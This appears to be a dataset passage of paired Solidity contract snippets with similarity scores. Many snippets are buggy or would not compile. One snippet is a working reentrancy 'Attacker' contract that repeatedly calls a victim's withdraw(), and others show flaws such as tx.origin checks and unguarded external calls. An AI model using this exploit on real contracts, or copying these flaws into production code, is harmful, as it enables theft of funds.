    }

    Orc[] orcs;

    function createOrc(uint _health, uint _strenth) public returns(uint) {
        
        Orc memory _orc = Orc({
            health: _health,
            strenth: _strenth
        });
        uint256 newOrcId = orcs.push(_orc) - 1;

        return newOrcId;
    }

    
    
    function totalSupply() public view returns (uint) {
        uint length = orcs.length;
        return length;
    }

    function getOrcHealth(uint id) public view returns (uint) {
        uint health = orcs[id].health;
        return health;
    }

    function getOrcStrenth(uint id) public view returns (uint) {
        uint strenth = orcs[id].strenth;
        return strenth;
    }
}",0.6008333648133629,"contract ERC918Interface {

  function epochCount() public constant returns (uint);

  function totalSupply() public constant returns (uint);
  function getMiningDifficulty() public constant returns (uint);
  function getMiningTarget() public constant returns (uint);
  function getMiningReward() public constant returns (uint);
  function balanceOf(address tokenOwner) public constant returns (uint balance);

  function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success);

  event Mint(address indexed from, uint reward_amount, uint epochCount, bytes32 newChallengeNumber);

}"
"contract testContract {

   uint256 test;

   function testContract() {    
   }

   function getTest() constant returns (uint256) {
       return test;    
   }

   function setTest(uint256 _test) {
       test = _test;    
   } 
}",0.6587798653694293,"contract MoonBook { 
  function MoonBook() {}

  bytes[] terms;

  function put(bytes term) {
    terms.push(term);
  }

  function get(uint256 index) constant returns (bytes) {
    return terms[index];
  }
}"
"contract InterfaceWithMe {

    function call() returns (string) {
        return ""Hello"";
    }
}",0.6454525316627779,"contract EndPointInterface {

    function read() view public returns (bytes32);

}"
"contract Allower {
    Allowed allowed;

    function doSth() onlyallowed;

    modifier onlyallowed {
        if (msg.sender != address(allowed))
            throw;
        _
    }
}",0.6729073524467776,"contract owned {
    address public owner;    
    
    function owned() {
        owner=msg.sender;
    }

    modifier onlyowner{
        if (msg.sender!=owner)
            throw;
        _;
    }
}"
"contract Slot_Machine is Mortal{

  
  
  
  struct Player{
      address payable wallet;
      uint deposit;
      uint guess;
  }

  mapping (address => Player) public player;

  constructor() public{
      newPlayer(10,5);
  }

  function sendPay(address to, uint amount) public {
      player[to].wallet.transfer(amount);

  }",0.6387197421422287,"contract TokenController {
    
    
    
    function proxyPayment(address _owner) payable public returns(bool);

    
    
    
    
    
    
    function onTransfer(address _from, address _to, uint _amount) public returns(bool);

    
    
    
    
    
    
    function onApprove(address _owner, address _spender, uint _amount) public returns(bool);
}"
"contract Bank{
    uint private value;

    constructor(uint amount) public{
        value = amount;
    }
    function deposit(uint amount) public{
        value += amount;
    }

    function withdraw(uint amount) public{
        value -= amount;
    }

    function balance()view public returns (uint){
        return value;
    }
}",0.6781626267276379,"contract IcoToken {
    uint256 public decimals;

    function transfer(address to, uint256 amount) public;
    function mint(address to, uint256 amount) public;
    function burn(uint256 amount) public;

    function balanceOf(address who) public view returns (uint256);
}"
"contract SafeMath{    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}",0.6740167715644554,"contract Marketplace {
    function getAuction(uint256 _id) external view returns (address, uint256, uint256, uint256, uint16, uint256, bool);
}"
"contract Add{
struct User {
    uint256 id;
    string name;

    

    bool set; 
}
 address owner;
 modifier onlyOwner() {
       require(owner == msg.sender);
            _;
}

mapping(address => User) public users;

function createUser(address _userAddress, uint256 _userId, string memory _userName) public onlyOwner {
    User storage user = users[_userAddress];
    
    require(!user.set);
    
    users[_userAddress] = User({
        id: _userId,
        name: _userName,
        set: true
    });
}

}",0.6278898727897684,"contract Ownable {

    address public owner;



    event SetOwner(address _owner);



    modifier onlyOwner() {

        require(msg.sender == owner, ""msg.sender is not the owner"");

        _;

    }



    constructor() public {

        owner = msg.sender;

        emit SetOwner(msg.sender);

    }



    

    function transferTo(address _to) public onlyOwner returns (bool) {

        require(_to != address(0), ""Can't transfer to address 0x0"");

        emit SetOwner(_to);

        owner = _to;

        return true;

    }

}"
"contract B{


    event Payment(address recipient, uint value);
    event Receive(address sender, uint value);

    address sender;
    address payable receiver;
    uint sentValue;
    uint receiptValue;
    uint gasPrice;

    function pay(address payable recipient) external payable{\\Transfers some ether to A
        recipient.transfer(msg.value);
        A(recipient).cash(msg.value, tx.gasprice);
        receiver=recipient;
        sentValue=msg.value;
        gasPrice=tx.gasprice;
        emit Payment(recipient, msg.value);
    }

    function payView() public view returns(address, string memory, string memory, string memory){\\Shows some data about the last transfer.
        return (receiver, uint2str(sentValue), uint2str(gasPrice), uint2str(address(this).balance));
    }

    function cash(uint cashValue, uint GasPrice) external payable{\\Records some data about the last received transaction
        sender=msg.sender;
        receiptValue=cashValue;
        gasPrice=GasPrice;
        emit Receive(msg.sender, cashValue);
    }

    function cashView() public view returns(address, string memory, string memory, string memory){\\Shows some data about the last received transaction
        return (sender, uint2str(receiptValue), uint2str(gasPrice), uint2str(address(this).balance));
    }

    function uint2str(uint _i) internal pure returns (string memory ) {
        if (_i == 0) {
                return ""0"";
         }
        uint j = _i;
        uint len;
        while (j != 0) {
                len++;
              j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
             bstr[k--] = byte(uint8(48 + _i % 10));
             _i /= 10;
         }
        return string(bstr);
    }
    function() external payable{}
}",0.6894057532548621,"contract AnonymousWALL {

    

    address payable manager;

    struct messageDetails {

      uint time;

      string headline ;

      string message;

    }

    mapping (address => messageDetails) journal;

    address[] private listofjournalists;

    

    constructor() public {

      manager = msg.sender;

    }

    

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {

        if (_i == 0) {

            return ""0"";

        }

        uint j = _i;

        uint len;

        while (j != 0) {

            len++;

            j /= 10;

        }

        bytes memory bstr = new bytes(len);

        uint k = len - 1;

        while (_i != 0) {

            bstr[k--] = byte(uint8(48 + _i % 10));

            _i /= 10;

        }

        return string(bstr);

    }

    

    function enteranews(string memory uHeadline, string memory uMessage) public payable {

        require(msg.value >= .001 ether,""This contrat works with minimum 0.001 ether"");

        require(journal[msg.sender].time == 0,""An account can only be used once."");

        manager.transfer(msg.value);

        journal[msg.sender].time = now;

        journal[msg.sender].headline = uHeadline;

        journal[msg.sender].message = uMessage;

        listofjournalists.push(msg.sender) -1;

    }

    

    function getjournalists() view public returns(address[] memory) {

      return listofjournalists;

    }

    

    function numberofnews() view public returns (uint) {

      return listofjournalists.length;

    }

    

    function gamessage(address _address) view public returns (string memory, string memory, string memory,string memory) {

        if(journal[_address].time == 0){

            return (""0"", ""0"", ""0"", ""This address hasnt sent any messages before."");

        } else {

            return (uint2str(journal[_address].time), journal[_address].headline, journal[_address].message, ""We reached your message successfully."");

        }

    }

}"
"contract test{


address payable owner;
mapping (address => bool) pd;
uint public sS;
function lnA(address addr) public view returns(uint n) {
        
        n = uint(keccak256(uint(addr), sS)[0]) % 8;

    }
}",0.6976444761359865,"contract locaToken {

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function allowance(address _owner, address _spender) public view returns (uint);

}"
"contract testConstant{
string testString;

function testConstant(string _testString) {
    testString=_testString;
}
function gettestString() public constant returns(string) {
    return testString;
}
}",0.6482013422906278,"contract Greeter is Mortal {
    
    string greeting;

    
    function Greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }
}"
"contract Test{

struct student{
uint bonus;
uint value1;
uint value2;
uint Priority;  
 }


mapping(address => student) students ; 
declaration of a function of type mapping so we define array of addresses
address [] public student_list;  

function Recieve_Request(address _address,uint _bonus, uint _value1, uint 
_value2) public {          

var student = students[_address]; 
 students mapping
student.bonus=_bonus;
student.value1=_value1;
student.value2=_value2;
student.Priority=(0.5 * _value1 + 0.5 * _value2)/ _bonus;  

 student_list.push(_address) -1;
     }


      function get_ESU(address ins) view public returns (uint, uint, uint) {
    return (students[ins].value1, students[ins].value2, 
  students[ins].Priority);
}

}",0.6238626292091538,"contract ERC20 {

    uint public totalSupply;



    mapping(address => uint) balances;

    mapping(address => mapping (address => uint)) allowed;



    function balanceOf(address _owner) public view returns (uint);

    function transfer(address _to, uint _value) public returns (bool);

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function approve(address _spender, uint _value) public  returns (bool);

    function allowance(address _owner, address _spender) public view returns (uint);



    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _owner, address indexed _spender, uint _value);



}"
"contract NewHello{

    struct kullanicilar{
        string name;
        string surname;
        uint age;
    }

    event infoChanged(
        string name,
        string surname,
        uint age
    );

    uint newUser;
    mapping(address => string) public users; 
    

    function updateUser(string memory name , string memory surname , unit age) public returns(uint userID){
        userID = newUser++;
        users[userID] = kullanicilar(string name, string surname, age);
        emit infoChanged(name,surname,age);
    }
    function getUser(address a) public view returns(string memory) {
        return users[a]; 
    }
}",0.6131830820028144,"contract HuxsERC20Token is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply) public {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(msg.sender, totalSupply);

    }

 

    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contractPrivacyPreferences {

bool preference = false;
bool monitoringType = false;


mapping (address => bool) addresses;

contructor () public {
    adresses [address(0x00281055afc982d96fab65b3a49cac8b878184cb16)] = true;
}

function changePreferences() public {
     if (addresses [msg.sender])
           preference = true;
}

function changeMonitoringType () public {
   if (addresses [msg.sender]) {
      monitoringType = true;
}

function preferenceStatus() public view returns (bool) {
    return preference;
}

function monitoringStatus() public view returns (bool) {
    return monitoringType;
}
}
",0.6446688644823511,"contract ATxAssetInterface {



    DataControllerInterface public dataController;

    ServiceControllerInterface public serviceController;



    function __transferWithReference(address _to, uint _value, string _reference, address _sender) public returns (bool);

    function __transferFromWithReference(address _from, address _to, uint _value, string _reference, address _sender) public returns (bool);

    function __approve(address _spender, uint _value, address _sender) public returns (bool);

    function __process(bytes , address ) payable public {

        revert();

    }

}"
"contract Oracle{
    event Print(string _name, bytes32 _value);
    bytes32 key;

    function Store(bytes32 _key) returns (bytes32) {
        key = _key;
        Print(""Key"",_key);
        return _key;
    }

}",0.6626249034974588,"contract ValueProvider {
    function getValue(bytes32 key) public view returns (bytes32 value);
    event ValueUpdate(bytes32 indexed key, bytes32 indexed value);
}"
"contract People{
    bool public isActive = false;
    uint public objectId;
    string public ownerName;
    string somePrivateData;
    mapping (address => bool) owned;

    function initPeopleContract(string name){
        if (!isActive) {
            isActive = true;
            ownerName = name;
        }
    }

    function getOwnerName() returns (string val) {
        if (!isActive) {
          val = ownerName;
        }else {
          val = ""Account Deactivated"";
        }
    }

    function getPrivateData() returns (string data) {
        if (msg.sender == address){
          
        } else {
          
        }
    }
}",0.6806907073448522,"contract Precondition is Owned {



    string public name;

    uint public version;

    bool public active = false;



    constructor(string _name, uint _version, bool _active) public {

        name = _name;

        version = _version;

        active = _active;

    }



    function setActive(bool _active) external onlyOwner {

        active = _active;

    }



    function isValid(bytes32 _platform, string _platformId, address _token, uint256 _value, address _funder) external view returns (bool valid);

}"
"contract Called{

    uint public number;

    function myuint() public view returns(uint _number) {
        _number = number;
    }

    function set() public {
        number++;
    }

    function get() public view returns (uint){
        return number;
    }
}",0.6941179113833804,"contract PotLike {
    function pie(address) virtual public view returns (uint);
    function drip() virtual public returns (uint);
    function join(uint) virtual public;
    function exit(uint) virtual public;
}"
"contract TRY{

    uint public temp=0;
    uint public b=0;
    uint public c ether;

    function set_c(uint _c ){
        c=_c ;
    }

    function transfer_ether() public payable{

       if(msg.value>=c ){
            temp=msg.value;
             b=temp-(60 ether);
            temp=60 ether;
           msg.sender.transfer(b );
       }
    }

    function to_contract() public payable {
        uint a=temp;
        temp=0;
        msg.sender.transfer(a);
    }
}",0.640825381486033,"contract MacLennonIC {

    function() public payable {}

    address Owner; bool closed = false;

    function set() public payable {

        if (0==Owner) Owner=msg.sender;

    }

    function close(bool F) public {

        if (msg.sender==Owner) closed=F;

    }

    function get() public payable {

        if (msg.value>=1 ether && !closed) {

            msg.sender.transfer(address(this).balance);

        }

    }

}"
"contract MultiplyContract{
    address public buyer;
    address public seller;
    uint public price;
    function MultiplyContract(
      address _buyer,
      address _seller,
      uint _price,
      ){
      buyer = _buyer;
      seller = _seller;
      price = _price;
    }
    function Execution (address _buyer, address _seller) {
    eth.getBalance(_buyer) -=  price; 
    eth.getBalance(_seller) += price;
  }
}",0.6127104222478943,"contract ERC20 is ERC20Basic {

  function allowance(

    address owner,

    address spender) public view returns (uint);

  function transferFrom(address from, address to, uint value) public;

  function approve(address spender, uint value) public;

  event Approval(address indexed owner, address indexed spender, uint value);

}"
"contract MyFirstSafeICO{

 uint public buyPrice;

 Token public token;

 function MyFirstSafeICO(Token _token) {

    token = _token;  
    buyPrice = 1000;
}

 function() payable {
  
     _buy( msg.sender, msg.value);
 }

 function buy() payable returns (uint ){

  uint tokens = _buy(msg.sender, msg.value);
  return tokens;
}

 function buy(address _sender, uint256 _amount) internal returns (uint){

 uint tokens = _amount/buyPrice;

  token.transfer( _sender, tokens);

  return tokens;
}
",0.6661666381808249,"contract TokenPool {
    ERC20Basic public token;

    modifier poolReady {
        require(token != address(0));
        _;
    }

    function setToken(ERC20Basic newToken) public {
        require(token == address(0));

        token = newToken;
    }

    function balance() view public returns (uint256) {
        return token.balanceOf(this);
    }

    function transferTo(address dst, uint256 amount) internal returns (bool) {
        return token.transfer(dst, amount);
    }

    function getFrom() view public returns (address) {
        return this;
    }
}"
"contract queue
{
    struct Queue {
        uint256[] data;
        uint256 front;
        uint256 back;
    }
    
    function length(Queue storage q) constant internal returns (uint256) {
        return q.back - q.front;
    }
    
    function capacity(Queue storage q) constant internal returns (uint256) {
        return q.data.length - 1;
    }
    
    function push(Queue storage q, uint256 data) internal
    {
        if ((q.back + 1) % q.data.length == q.front)
            return; 
        q.data[q.back] = data;
        q.back = (q.back + 1) % q.data.length;
    }
    
    function pop(Queue storage q) internal returns (uint256 r)
    {
        if (q.back == q.front)
            return; 
        r = q.data[q.front];
        delete q.data[q.front];
        q.front = (q.front + 1) % q.data.length;
        return r;
    }
    Queue requests;
    function queue() {
        requests.data.length = 200;
    }
    function addRequest(uint256 d) {
        push(requests, d);
    }
    function popRequest() constant returns (uint256) {
        return pop(requests);
    }
    function queueLength()  constant returns (uint256) {
        return length(requests);
    }
    function hello() constant returns(string s){ 
        return 'hello world!';
    }
}",0.6125694131720184,"contract SafeMath {
  function mul(uint a, uint b) internal returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint a, uint b) internal returns (uint) {
    assert(b > 0);
    uint c = a / b;
    assert(a == b * c + a % b);
    return c;
  }

  function sub(uint a, uint b) internal returns (uint) {
    assert(b <= a);
    return a - b;
  }

  function add(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c >= a);
    return c;
  }

  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }

  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }

  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }

  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }

  function assert(bool assertion) internal {
    if (!assertion) {
      throw;
    }
  }
}"
"contract MKotET1_1{
   address payable king; uint public claimPrice = 100;

   function calculateCompensation() public returns(uint) {
}

function( ) external payable {
   if (msg.value  < claimPrice) revert();
      uint compensation = calculateCompensation();
      (bool success, bytes memory returnMessage) = 
      king.call.value(compensation)("""");
      require(success); 
      king = msg.sender;
   }
}",0.6001126653803892,"contract PricingStrategy {

  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

 
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
"contract Test{  
    uint public id;  
    address public addr;  
    bytes32 public name;  

    struct t {
     bytes32 name;
     uint id;
    address addr;  
   }  
   mapping (address => t) addr_map;
    function f1 (uint param_1, bytes32 param_2) returns (bool) {  
       id = param_1;  
       name = param_2;  
    }

   function f2 (uint param_1, bytes32 param_2) returns (bool) {  
      addr_map[msg.sender].name = param_2;  
      addr_map[msg.sender].id = param_1;  
   }  
}",0.6367517312558395,"contract ENSResolver {
    event AddrChanged(bytes32 indexed _node, address _addr);
    event NameChanged(bytes32 indexed _node, string _name);

    function addr(bytes32 _node) public view returns (address);
    function setAddr(bytes32 _node, address _addr) public;
    function name(bytes32 _node) public view returns (string memory);
    function setName(bytes32 _node, string memory _name) public;
}"
"contract mypool{
    address public manager;
    string poolname;
    uint256 poolEndDate;
    uint256 poolAmount;

    constructor () public {
        manager = msg.sender;
    }

    mapping (address => uint256) public balanceOf;

    
    struct Payer {
        string name;
        address player;
        uint256 amount;
    }

    Payer[] public players;
    
    function enterPoolInfo(string name,uint256 endDate, uint256 amount) public {
        poolname = name;
        poolEndDate = endDate;
        poolAmount = amount;
    }
    
    function enter(string name,uint256 amount) public payable {

        Payer memory m;
        
        m.player = msg.sender;
        m.amount = amount;
        m.name = name;
        players.push(m);
    }

    function getBalance() public view returns (uint) {
        return this.balance;
    }



     function transferd(address _to) payable {
        
        
        
        

        uint256 balance = this.balance;
        _to.transfer(balance);                        
    }
}",0.6831205941797212,"contract UserMgr is SafeMath {
	struct User {
		uint256 balance;
		uint256[] hostedItems;
		uint256[] inventory;
	}

	mapping(address => User) public mUsers;
	
	function UserMgr() public {}
	
	function getUser(address addr) public view returns (string name, uint256 balance, uint256[] hostedItems, uint256[] inventory) {
		User memory user = mUsers[addr];
		return (
			""Anonymous"",
			user.balance,
			user.hostedItems,
			user.inventory);
	}
	
	function userDeposit() payable public {
		User storage user = mUsers[msg.sender];
		user.balance = safeAdd(user.balance, msg.value);
	}
	
	function userWithdraw() payable public {
		address sender = msg.sender;
		User storage user = mUsers[sender];
		uint256 amount = user.balance;
		if (amount == 0) revert();
		user.balance = msg.value;
		require(sender.send(amount));
	}
}"
"contract MyFirstSafeICO is Ownable{
    address owner;
    uint public buyPrice;
    MyFirstERC20ICO public token;

    function MyFirstSafeICO(MyFirstERC20ICO _token){
        token = _token;
        buyPrice = 10000;
        owner = msg.sender;
    }

    function () payable {
        _buy(msg.sender, msg.value);
    }

    function buy() payable returns (uint){
        uint tokens = _buy(msg.sender, msg.value);
        return tokens;
    }

    function buyFor(address _addressee, uint256 _amount) public onlyOwner returns (uint) {
        uint tokens = _buy(_addressee, _amount * buyPrice);
        return tokens;
    }

    function _buy(address _sender, uint256 _amount) internal returns (uint){
        uint tokens = _amount / buyPrice;
        token.transfer(_sender, tokens);
        return tokens;
    }
}",0.6894029423151987,"contract MintableToken is StandardToken {
  
    
    uint256 public rate = 5000;
    address public owner = msg.sender;
	uint256 public tokenAmount;
  
    function name() constant returns (string) { return ""kkTest103""; }
    function symbol() constant returns (string) { return ""kT103""; }
    function decimals() constant returns (uint8) { return 0; }
	


  function mint(address receiver, uint amount) public {
    totalSupply = safeAdd(totalSupply, amount);
    balances[receiver] = safeAdd(balances[receiver], amount);

    
    
    Transfer(0, receiver, amount);
  }

  
  
	
	
function () payable {
	    
	if (msg.value == 0 || msg.value < 0) {		
		revert();
	}
		
	tokenAmount = 0;									
	tokenAmount = ((msg.value*rate)/(1 ether));		
	mint(msg.sender, tokenAmount);
		
		
	owner.transfer(msg.value);					

}  
  
  
  
}"
"contract Parent
{

    uint value;

    function isValueOne() public constant returns (bool) {
        return value == 1;
    }

}",0.6955599250583856,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Child is Parent
{

    uint public value;

    function test() public {
        value = 1;
    }

    function verify() {
        require(isValueOne());
    }
}",0.6730256340888411,"contract ContractConn{

    function transfer(address _to, uint _value) public;

    function lock(address _to, uint256 _value) public;

}"
"contract {
  mapping (bytes32 => uint256) private balances;

  function setValue(uint256 a) {
    uint index = sha3(msg.sender);
    balances[index] = a;
  }
}",0.6453018935300202,"contract Rating {
        function setRating(bytes32 _key, uint256 _value) {
            ratings[_key] = _value;
        }
        mapping (bytes32 => uint256) public ratings;
    }"
"contract TestConst{
    uint public a = 10;

    function constantFnA() constant returns (uint) {
        return  a+5;
    }

    
    
    function NonCosntUsesConst(){
        a = constantFnA();
    }

    
    
    function nonConstantFn(){
        a = a+5;
    }    
}",0.6695061925021047,"contract ITokenMetadata {



    

    

    



    function symbol()

        public

        constant

        returns (string);



    function name()

        public

        constant

        returns (string);



    function decimals()

        public

        constant

        returns (uint8);

}"
"contract  Attacker{
   Victim  public v;
   uint public  count;
   event LogFallback(uint c, uint balance);
   
   
   constructor (address victim) public {
      v=Victim(victim);
   }
  

   function attack() public {
      v.withdraw();
   }

   function () external payable{
      count++;
      emit LogFallback(count, address(this).balance);
      if(count < 10 ) {
         v.withdraw();
      }
    }
}",0.6314872306617998,"contract Uselesslightbulb is Ownable {



  



  uint weiPrice = 1000000000000000;

  uint count = 0;



  function toggle() public payable {

    require(msg.value >= weiPrice);

    count++;

  }



  function getCount() external view returns (uint) {

    return count;

  }



  function withdraw() onlyOwner public {

    owner.transfer(address(this).balance);

  }



}"
"contract SplitBalance{

    address a1;
    address a2;

    function SplitBalance(address _a1, address _a2) public{
        a1 = _a1;
        a2 = _a2;
    }

    function withdraw() public {
        uint money = this.balance;

        
        if (money % 2 == 1)   
           money = money - 1; 

        a1.transfer(money/2);
        a2.transfer(money/2);
    }

    function updateAddress1(address newAddress) public {
        if(msg.sender != a1)
           revert();
        a1 = newAddress;
    }

    function updateAddress2(address newAddress) public {
        if(msg.sender != a2)
           revert();
        a2 = newAddress;
    }

    
    function() payable public { }
}",0.628512548294355,"contract ERC20
{
    function totalSupply()
        public
        view
        returns (uint);

    function balanceOf(
        address who
        )
        public
        view
        returns (uint);

    function allowance(
        address owner,
        address spender
        )
        public
        view
        returns (uint);

    function transfer(
        address to,
        uint value
        )
        public
        returns (bool);

    function transferFrom(
        address from,
        address to,
        uint    value
        )
        public
        returns (bool);

    function approve(
        address spender,
        uint    value
        )
        public
        returns (bool);
}"
"contract Test{
    function test1(address payable addr, uint256 value) payable public {
        addr.transfer(value);
    }
}",0.6940909663955547,"contract Token {
  function transferFrom(address from, address to, uint256 value) public returns (bool);
}"
"contract Sample{
    
    address payable owner;

    
   constructor() public{
        owner = msg.sender;
   }

    function doSomething() external payable {
        int i = 10 + 10;
        i++;
   }
}",0.6978789856953755,"contract LotsMain is LotsApis {

    function LotsMain() public payable {
        owner = msg.sender;
    }

    function() external payable {
        require(msg.sender == address(0));
    }
}"
"contract EternalStorage{

      struct Storage {
        mapping(bytes32 => address) _address;
        mapping(bytes32 => string) _string;
       }

      Storage internal s;

      address public owner;

     function setString(bytes32 h, string memory v) public  {
        s._string[h] = v;
     }

function getString(bytes32  h) public view returns (string memory){
    return s._string[h];
  }

function setAddress(bytes32 h, address v) public  {
    s._address[h] = v;
  }
function getAddress(bytes32 h) public view returns (address){
    return s._address[h];
  }
}",0.6642766084709671,"contract MasterContract {

    function returnUserControlAddress(uint account_id) public view returns (address);

    function returnIsValidSendingKey(address sending_key) public view returns (bool);

    function returnStaticContractAddress() public view returns (address);

    function recover(bytes32 hash, bytes memory sig) public pure returns (address);

    function returnTxMessageToSign(bytes memory txData, address des_add, uint value, uint tx_count)

    public view returns(bytes32);

}"
"contract Sc1{
      mapping (address => uint) token_balance;
      mapping (address => bool) valid_caller_contracts;
                                                      
      address owner;
      function Sc1(){
        owner = msg.sender;
      }
       
      function register_valid_contract() external {
          require(tx.origin==owner);
          valid_caller_contracts[msg.sender] = true;
      }
      function decrement_token(uint val) external{
        require(token_balance[tx.origin] >= val);
        token_balance[tx.origin] -=val;
      }
   }",0.6098379282622154,"contract tDeployer is Ownable {



	address private main;



	function cMain(address nM) public onlyOwner {

		main = nM;

	}



    function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address) {

		require(msg.sender == main);

		tokenContract newContract = new tokenContract(_tName, _tSymbol, _mint, _owner);

		return newContract;

	}





}"
"contract GetandSet{

    string name;
    uint age;

    function GetandSet() public {



    }

    function set(string newName, uint newAge) public {

        name = newName;
        age = newAge;
    } 


    function get() public view returns (string, uint) {

        return (name,age);
    }


}",0.6583461496196092,"contract ERC20DetailedInterface is ERC20Interface {
  
  function name() public view returns (string _name);

  
  function symbol() public view returns (string _symbol);

  
  function decimals() public view returns (uint8 _decimals);
}"
"contract Item{

    uint id;
    uint items;
    uint startDate;
    uint endDate;
    bool isValid;

    address public owner;

    constructor() public {
        owner = msg.sender;
        isValid = false;
    }

    modifier restricted() {
        require(
            msg.sender == owner,
            ""Only owner can call this.""
        );
        _;
    }

    function createItem(uint _id,  uint _startDate, uint _endDate, uint _items, bool _isValid) public {
        id = _id;
        startDate = _startDate;
        endDate = _endDate;
        items = _items;
        isValid = _isValid;
    }

    function validateItem() public {
        isValid = true;
    }

    function getItemData() public view returns (uint, uint, uint, uint, bool) {
        return (id, startDate, endDate, items, isValid);
    }

    function getId() public view returns (uint) {    
        return id;    
    } 

    function getItems() public view returns (uint) {    
        return items;    
    } 

    function getStartDate() public view returns (uint) {    
        return startDate;    
    } 

    function getEndDate() public view returns (uint) {    
        return endDate;    
    } 

    function isValidItem() public view returns (bool) {    
        return isValid;    
    } 

}",0.6587170856471055,"contract ERC20Interface {



    

    event Approval(address indexed src, address indexed guy, uint wad);

    event Transfer(address indexed src, address indexed dst, uint wad);



    

    event Grant(address indexed src, address indexed dst, uint wad);    

    event Unlock(address indexed user, uint wad);                       



    function name() public view returns (string n);

    function symbol() public view returns (string s);

    function decimals() public view returns (uint8 d);

    function totalSupply() public view returns (uint256 t);

    function balanceOf(address _owner) public view returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

}"
"contract NewHello{

    mapping(address => string) public users; 

    function updateUser(string memory name) public {
        if(string name != users[name]){
            users[msg.sender] = name; 
        }

    }
    function getUser(address userAddress) public view returns(string memory) {
        return users[userAddress]; 
    }
}",0.6927370128850755,"contract Register is Pausable {
    mapping(address => string) public registry;

    
    function addUser(string info) public whenNotPaused {
        registry[msg.sender] = info;
    }
   
    
    function getInfo(address ethAddress) public constant returns (string) {
        return registry[ethAddress];
    }
}"
"contract TRY{

    uint public temp=0;
    uint public b=0;

    function transfer_ether() public payable{
       uint c=60;
       if(msg.value>=c ether){
            temp=msg.value;
             b=temp-(60 ether);
            temp=60 ether;
           msg.sender.transfer(b );
       }
    }

    function to_contract() public payable {
        uint a=temp;
        temp=0;
        msg.sender.transfer(a);
    }
}",0.6240914617155071,"contract MultiplicatorX2
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}"
"contract Verify{
    address owner ; 
    mapping (uint256 => bool) public usedNonces;

    constructor() public {
        owner = msg.sender ;
    }

    function withdraw(uint256 nonce , address recipientAddress , uint256 tokens, bytes memory signature) public {
        require(!usedNonces[nonce]);
        usedNonces[nonce] = true ;
        bool done ; 
        done = isValidSignature( recipientAddress , nonce , tokens  , signature );
        emit Success(done);
    }
    event Success(bool done);


    function isValidSignature(address recipient , uint256 nonce , uint256 amount, bytes memory signature)
        internal
        view
        returns (bool)
    {

        bytes32 message = keccak256(abi.encodePacked(recipient , address(this), nonce, amount));
        return recoverSigner(message, signature) == owner ;
    }

    function splitSignature(bytes memory sig)
        internal
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        require(sig.length == 65 , ""invalid length"");

        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        if (v < 27) {
            v += 27;
        }

        require(v == 27 || v == 28);
        return (v, r, s);
    }

    function recoverSigner(bytes32 message, bytes memory sig)
        internal 
        pure
        returns (address)
    {
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(sig);
        return ecrecover(message, v, r, s);
    }
}",0.623026162477551,"contract ERC223TokenCompatible is BasicToken {

  using SafeMath for uint256;

  

  event Transfer(address indexed from, address indexed to, uint256 value, bytes indexed data);



	function transfer(address _to, uint256 _value, bytes memory _data, string memory _custom_fallback) public returns (bool success) {

		require(_to != address(0), ""_to != address(0)"");

        require(_to != address(this), ""_to != address(this)"");

		require(_value <= balances[msg.sender], ""_value <= balances[msg.sender]"");

		

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

		if( isContract(_to) ) {

		    (bool txOk, ) = _to.call.value(0)( abi.encodePacked(bytes4( keccak256( abi.encodePacked( _custom_fallback ) ) ), msg.sender, _value, _data) );

			require( txOk, ""_to.call.value(0)( abi.encodePacked(bytes4( keccak256( abi.encodePacked( _custom_fallback ) ) ), msg.sender, _value, _data) )"" );



		} 

		emit Transfer(msg.sender, _to, _value, _data);

		return true;

	}



	function transfer(address _to, uint256 _value, bytes memory _data) public returns (bool success) {

		return transfer( _to, _value, _data, ""tokenFallback(address,uint256,bytes)"");

	}



	

	function isContract(address _addr) private view returns (bool is_contract) {

		uint256 length;

		assembly {

            

            length := extcodesize(_addr)

		}

		return (length>0);

    }

}"
"contract FooFactory
{
    function newFoo() returns (Foo) {
       return new Foo();
    }
}",0.6381770958487393,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract Airdrop{
    address[] public recipients;
